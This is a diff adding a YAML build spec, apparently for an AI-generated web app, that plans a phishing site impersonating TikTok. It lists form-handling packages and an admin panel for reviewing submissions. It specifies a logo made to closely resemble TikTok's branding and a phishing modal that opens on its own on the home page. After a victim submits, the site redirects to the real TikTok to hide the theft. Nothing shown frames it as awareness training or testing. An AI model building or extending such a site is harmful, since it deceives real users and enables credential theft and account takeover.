@@ -1,0 +1,16 @@
+packages:
+  "framer-motion": "For smooth modal and page animations"
+  "react-hook-form": "For robust form state management"
+  "@hookform/resolvers": "For Zod validation integration"
+  "zod": "For schema validation"
+  "date-fns": "For formatting submission dates in the admin panel"
+
+images:
+  - path: "artifacts/tiktok-phish/public/images/tiktok-logo.png"
+    description: "A minimalist white text logo saying 'TikTok' with a cyan and red shadow offset effect on a transparent background, closely resembling the official branding."
+    aspect_ratio: "16:9"
+
+notes:
+  - Using generated API hooks from @workspace/api-client-react
+  - The phishing modal auto-opens on the home page.
+  - Redirects to actual TikTok after successful submission.
